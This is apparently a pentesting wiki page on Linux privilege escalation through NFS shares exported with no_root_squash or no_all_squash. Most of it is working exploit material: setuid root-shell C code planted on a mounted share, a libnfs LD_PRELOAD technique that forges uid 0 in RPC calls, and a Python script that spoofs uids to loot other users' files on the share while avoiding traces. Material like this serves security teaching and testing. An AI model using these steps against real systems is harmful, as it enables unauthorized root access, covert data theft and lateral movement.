# NFS no\_root\_squash/no\_all\_squash

## Theory

If you find some NFS directory that is configured as **no\_root\_squash**, then you can **access** it from **as a client** and **write inside** that directory **as** if you were the local **root** of the machine.

**no\_root\_squash**: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implications.

**no\_all\_squash:** This is similar to **no\_root\_squash** option but applies to **non-root users**. Imagine, you have a shell as nobody user; checked /etc/exports file; no\_all\_squash option is present; check /etc/passwd file; emulate a non-root user; create a suid file as that user (by mounting using nfs). Execute the suid as nobody user and become different user.

## Practice

{% tabs %}
{% tab title="Enumerate" %}
To enumerate the NFS server’s configuration, all we need to do is view the contents of the **/etc/exports** file.

```bash
$ cat /etc/exports
```

If you see a share with the **no\_all\_squash or no\_root\_squash** configuration, you may be able to exploit it.
{% endtab %}

{% tab title="Exploit - Remote" %}
To exploit this privilege escalation vector, we will :

* mount the share from another machine where you’re root
* place a setuid binary there
* on the victim machine, run the binary and get root

On the attacking machine, mount the vulnerable share:

```bash
#Attacker, as root user
mkdir /mnt/pe
mount -t nfs <IP>:<SHARED_FOLDER> /mnt/pe
```

Creat a setuid binary and copy it to the mounted share

```bash
# Attacker, as root user
## Create a SUID binary
echo 'int main() { setgid(0); setuid(0); system("/bin/bash -p"); return 0; }' > /tmp/root_shell.c
gcc /tmp/root_shell.c -o /tmp/root_shell

## Copy the binary and set the uid byte
cd /mnt/pe
cp /tmp/root_shell .
chmod +s root_shell
```

On the victime computer, as a low privilege user:

```bash
# Victime, as low privilege user
cd <SHAREDD_FOLDER>
./root_shell 
#ROOT shell
```

{% hint style="success" %}
You can copy the **/bin/bash** binary directly and give it SUID rights instead of compiling a new binary.
{% endhint %}
{% endtab %}

{% tab title="Exploit - Local" %}
If the `/etc/exports` has an explicit list of IP addresses allowed to mount the share, we won't be able to make the remote exploit and you will need to **abuse this trick and exploit no\_root\_squash/no\_all\_squash locally with an unprivileged user**.

When [listing the NFS shares](../../../network-pentesting/protocols/nfs.md#showmount), it will show IP allowed to mount the share:

```bash
$ showmount -e nfs-server
Export list for nfs-server:
/nfs_root   machine
```

{% hint style="info" %}
Another required requirement for the exploit to work is that **the export inside `/etc/export`** **must be using the `insecure` flag**.\
_I'm not sure that if `/etc/export` is indicating an IP address this trick will work_
{% endhint %}

This exploit relies on a problem in the NFSv3 specification that mandates that it’s up to the client to advertise its uid/gid when accessing the share. Thus it’s possible to fake the uid/gid by forging the NFS RPC calls if the share is already mounted!

#### Compiling the example <a href="#compiling-the-example" id="compiling-the-example"></a>

Here’s a [library that lets you do just that](https://github.com/sahlberg/libnfs). Depending on your kernel, you might need to adapt the example. In my case I had to comment out the fallocate syscalls.

```bash
# On local NFS server or computer that have access to the share
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Exploiting using the library <a href="#exploiting-using-the-library" id="exploiting-using-the-library"></a>

Let’s use the simplest of exploits:

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

Place our exploit on the share and make it suid root by faking our uid in the RPC calls:

```bash
# On local NFS server or computer that have access to the share
LD_NFS_UID=0 LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

All that’s left is to launch it:

```bash
# On local NFS server or computer that have access to the share
$ /mnt/share/a.out
# root shell
```
{% endtab %}
{% endtabs %}

### NFShell <a href="#bonus-nfshell" id="bonus-nfshell"></a>

Once local root on the machine, I wanted to loot the NFS share for possible secrets that would let me pivot. But there were many users of the share all with their own uids that I couldn’t read despite being root because of the uid mismatch. I didn’t want to leave obvious traces such as a chown -R, so I rolled a little snippet to set my uid prior to running the desired shell command:

{% tabs %}
{% tab title="NFShell" %}
```python
#!/usr/bin/env python
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

You can then run most commands as you normally would by prefixing them with the script:

```
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old

# ls -la ./mount/9.3_old/
ls: cannot open directory ./mount/9.3_old/: Permission denied

# ./nfsh.py ls --color -l ./mount/9.3_old/
drwxr-x---  2 1008 1009 1024 Apr  5  2017 bin
drwxr-x---  4 1008 1009 1024 Apr  5  2017 conf
drwx------ 15 1008 1009 1024 Apr  5  2017 data
drwxr-x---  2 1008 1009 1024 Apr  5  2017 install
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe" %}

{% embed url="https://www.errno.fr/nfs_privesc.html" %}

{% embed url="https://www.errno.fr/nfs_privesc.html" %}
